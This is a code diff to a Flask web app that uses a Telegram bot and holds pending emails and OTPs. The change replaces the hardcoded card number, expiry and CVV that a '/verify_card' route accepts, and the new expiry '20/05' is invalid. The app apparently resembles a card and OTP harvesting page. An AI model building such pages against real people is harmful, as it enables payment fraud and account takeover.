@@ -12,7 +12,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 pending_emails = {}
 pending_otps = {}
-web_status = True  # True = online, False = offline
+web_status = True
 
 # ==================== WEBSITE OFF/ON CHECK ====================
 @app.before_request
@@ -135,6 +135,7 @@ def page8():
 def page9():
     return render_template('page9.html')
 
+# ==================== VERIFY CARD — NEW DETAILS ====================
 @app.route('/verify_card', methods=['POST'])
 def verify_card():
     data = request.json
@@ -142,9 +143,13 @@ def verify_card():
     expiry = data.get('expiry')
     cvv = data.get('cvv')
     name = data.get('name')
-    if card == "4532 1234 5678 9012" and expiry == "08/28" and cvv == "123" and name.upper() == "MRX BUDDY":
+    
+    # New card details
+    if card == "7653 0584 4340 2005" and expiry == "20/05" and cvv == "404" and name.upper() == "MRX BUDDY":
         return jsonify({'success': True})
     return jsonify({'success': False})
+
+# ==================== EMAIL & OTP ROUTES ====================
 
 @app.route('/submit_email', methods=['POST'])
 def submit_email():
